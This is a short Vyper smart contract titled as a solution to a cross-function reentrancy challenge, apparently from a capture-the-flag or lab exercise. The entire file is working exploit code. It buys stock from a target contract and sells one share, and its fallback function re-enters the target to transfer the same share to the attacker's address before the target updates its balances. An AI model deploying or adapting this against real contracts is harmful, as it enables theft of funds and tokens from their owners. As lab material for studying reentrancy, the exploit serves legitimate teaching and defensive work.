# @version 0.2.15

"""
@author KLM
@title Solve for The Cross Function Reentrancy
"""
# External Interfaces
interface SS:
    def buyStock(): payable
    def sellStock(sell_order: uint256): nonpayable
    def transferStock(receiver: address, transfer_order: uint256): nonpayable
    def company() -> address: view
    def totalShares() -> uint256: view
    def price() -> uint256: view

snaketarget: SS
me: address

@external
def setparams(_target: address, _me: address):
    self.snaketarget = SS(_target)
    self.me = _me

@external
@payable
def step1():
    self.snaketarget.buyStock(value=msg.value)

@external
def step2():
    self.snaketarget.sellStock(1)

@external
@payable
def __default__():
    self.snaketarget.transferStock(self.me,1)
